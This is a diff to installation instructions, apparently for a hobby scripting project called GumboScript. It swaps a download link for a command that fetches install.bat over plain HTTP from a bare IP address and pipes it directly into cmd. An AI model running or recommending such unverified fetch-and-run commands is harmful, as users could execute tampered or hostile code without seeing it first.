@@ -9,10 +9,14 @@ Luckily, this isn't a hard process.
 
 ## Step 1: Downloading the project
 
-Download the installer from [here](files/install.bat)
+Run this command in command prompt:
+```
+curl http://72.66.54.109:8000/quick/GumboScript/install.bat | cmd
+```
+This will download `install.bat` and run it. If you don't trust me,
+the contents of this file are on github.
 
-The contents of this installer are as follows:
-
+They're also right here:
 ```
 {% include install.bat %}```
 
